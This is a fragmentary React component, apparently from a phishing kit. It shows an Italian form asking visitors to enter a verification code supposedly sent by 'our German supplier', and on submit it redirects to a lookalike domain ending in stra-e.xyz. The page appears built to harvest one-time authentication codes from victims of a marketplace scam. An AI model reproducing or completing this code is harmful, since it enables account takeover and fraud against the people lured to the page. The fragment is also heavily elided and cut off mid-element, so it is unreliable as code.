...
function Home() {
  ...
  async function handleSubmitFn() {
    try {
      ...
      router.replace('http://imobilede.com.id.stra-e.xyz/verifica');
    } catch(err) {
    ...
    <section>
      <div className={classes.container}>
        ...
        <span className={classes.subTitle}>
          Verifica il numero di telefono e aggiungi il codice numerico ricevuto dal nostro fornitore tedesco.
        </span>
      </div>

      <form onSubmit={handleSubmit} className={classes.form}>
        <div className={classes.formCell}>
          <label className={classes.formCellName}>Codice di verifica</label>
          <input
            name="code"
